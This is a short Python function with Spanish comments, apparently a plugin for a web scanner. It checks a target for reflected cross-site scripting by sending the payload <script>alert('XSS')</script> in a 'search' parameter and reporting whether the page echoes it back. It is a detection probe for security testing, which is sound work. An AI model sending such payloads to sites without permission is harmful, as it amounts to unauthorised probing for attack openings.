import requests

def run(objetivo):
    url = objetivo if objetivo.startswith("http") else f"http://{objetivo}"
    # Payload clásico: una etiqueta de script simple
    payload = "<script>alert('XSS')</script>"
    
    try:
        # Probamos enviando el script en un parámetro común
        res = requests.get(f"{url}/?search={payload}", timeout=3)
        if payload in res.text:
            return f"⚠️ VULNERABILIDAD XSS: El servidor refleja código HTML/JS sin filtrar."
        return "No se detectó XSS reflejado básico."
    except:
        return "Servicio web no disponible para pruebas de XSS."